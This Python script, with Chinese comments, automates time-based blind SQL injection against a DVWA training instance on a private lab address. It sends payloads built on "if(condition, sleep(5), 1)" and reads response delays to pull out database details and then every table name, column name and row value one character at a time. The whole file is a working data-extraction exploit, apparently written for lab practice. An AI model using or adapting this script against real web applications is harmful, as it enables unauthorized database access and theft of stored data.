import requests
import re

class Dvwa(object):
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36'
        }
        self.cookies = 'security=low; PHPSESSID=91aeb395eaaa8ab6d98c3e08904fa637'
        self.base_url = 'http://192.168.174.129/dvwa/vulnerabilities/sqli_blind/?id=1{}&Submit=Submit#'
        self.base_url1 = ''
        self.base_url2 = ''
        self.cook_dict = {}
        self.names = ['database()','current_user()','system_user()','version()','user()','@@datadir','@@version_compile_os']
        self.infos = {}

    #得到cookie_dict
    def get_cook_dict(self):
         self.cook_dict = {
            cookie.split('=')[0]: cookie.split('=')[1] for cookie in self.cookies.split('; ')
        }

    # 发起请求，得到请求时间
    def get_response_time(self, url):
        response = requests.get(url, headers=self.headers, cookies=self.cook_dict)
        time = response.elapsed.total_seconds()
        return time

    #构建判断目标长度的url
    def get_goal_length_url(self,name):
        if name in self.names:
            self.base_url2 = self.base_url.format(
                '%27+and+if(char_length({}'.format(name) + ')%3d{}%2csleep(5)%2c1)+--+')
        else:
            self.base_url2 = self.base_url.format('%27+and+if((' + name + ')%3d{}%2csleep(5)%2c1)+--+')

    # 得到目标个数
    def get_length(self,num):
        for i in range(0, num):
            url = self.base_url2.format(i)
            if self.get_response_time(url) >= 5:
                return i

    # 得到目标名字
    def get_goal_length(self,name):
        goal_name = ''
        self.base_url1 = self.base_url.format(
            '%27+and+if(ascii(substr(({})'.format(name) + '%2c{}%2c1))%3d{}%2csleep(5)%2c1)+--+')
        #长度
        for i in range(1, 500):
            url = self.base_url2.format(i)
            if  self.get_response_time(url) >= 5:
                for j in range(1, i + 1):
                    for k in range(0, 128):
                        url2 = self.base_url1.format(j, k)
                        if self.get_response_time(url2) >= 5:
                            # 看进度
                            goal_name += chr(int(k))
                            print(goal_name)
        return goal_name
    #获取基本信息
    def load_base_info(self):
        for name in self.names:
            self.get_goal_length_url(name)
            info = self.get_goal_length(name)
            self.infos[name] = info
            print(name+':'+ info)
        print(self.infos)

    def load_table_name(self):
        #生成base_url1
        self.get_goal_length_url('select+count(*)+from+information_schema.tables+where+table_schema%3ddatabase()')
        #获取表的个数
        counts = self.get_length(10)
        for i in range(0,counts):
            # 生成base_url1
            self.get_goal_length_url('select+length(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()+limit+{}%2c1'.format(i))
            #获取表名
            table_name = self.get_goal_length('select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+{}%2c1'.format(i))
            # 生成base_url1
            self.get_goal_length_url('select+count(*)+from+information_schema.columns+where+table_name%3d%27{}%27'.format(table_name))
            #获取列的个数
            counts2 = self.get_length(20)
            for j in range(0,counts2):
                # 生成base_url1
                self.get_goal_length_url('select+length(column_name)+from+information_schema.columns+where+table_name%3d%27'+table_name+'%27+limit+{}%2c1'.format(j))
                #获取列名
                line_name = self.get_goal_length('select+column_name+from+information_schema.columns+where+table_name%3d%27'+table_name+'%27+limit+{}%2c1'.format(j))
                #生成base_url1
                self.get_goal_length_url('select+COUNT(*)+from+ '+table_name)
                #获取行的个数
                counts3 = self.get_length(50)
                if counts3 == 0:
                    print(table_name+'这是个空表')
                else:
                    for z in range(0,counts3):
                        #base_url1
                        self.get_goal_length_url('Select+length((select+'+line_name+'+from+'+table_name+'+LIMIT+{}%2c1))'.format(z))
                        #获取具体的数据
                        line_value = self.get_goal_length('select+' + line_name + '+from+' + table_name + '+LIMIT+{}%2c1'.format(z))

    def start(self):
        self.get_cook_dict()
        # self.load_base_info()
        self.load_table_name()

if __name__ == '__main__':
    Dvwa().start()
